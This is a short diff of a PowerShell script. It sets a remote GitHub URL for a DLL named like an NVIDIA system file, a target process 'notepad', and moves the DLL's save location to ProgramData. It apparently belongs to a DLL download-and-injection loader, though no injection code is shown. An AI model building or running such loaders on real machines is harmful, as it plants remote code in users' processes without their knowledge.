@@ -59,7 +59,7 @@ function Run-AutoClean {
 
 Run-AutoClean
 $DLL_URL = "https://raw.githubusercontent.com/aspectxxyz/dllxen/refs/heads/main/nvoifapi64.dll" 
-$DllPath = "C:\Windows\System32\nvoifapi64.dll"
+$DllPath = "C:\ProgramData\nvoifapi64.dll"
 $ProcessName = "notepad"
 
 function Show-Menu {
